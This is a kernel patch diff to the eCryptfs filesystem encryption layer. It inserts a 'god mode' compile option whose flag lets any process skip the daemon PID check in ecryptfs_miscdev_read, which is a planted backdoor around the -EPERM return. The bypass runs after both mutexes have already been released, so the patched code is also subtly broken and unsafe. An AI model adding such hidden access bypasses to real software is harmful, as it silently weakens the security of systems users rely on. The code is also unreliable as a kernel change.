@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /**
  * eCryptfs: Linux filesystem encryption layer
  *
@@ -282,7 +285,15 @@ ecryptfs_miscdev_read(struct file *file, char __user *buf, size_t count,
 	if (task_pid(current) != daemon->pid) {
 		mutex_unlock(&daemon->mux);
 		mutex_unlock(&ecryptfs_daemon_hash_mux);
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 	if (daemon->flags & ECRYPTFS_DAEMON_ZOMBIE) {
 		rc = 0;
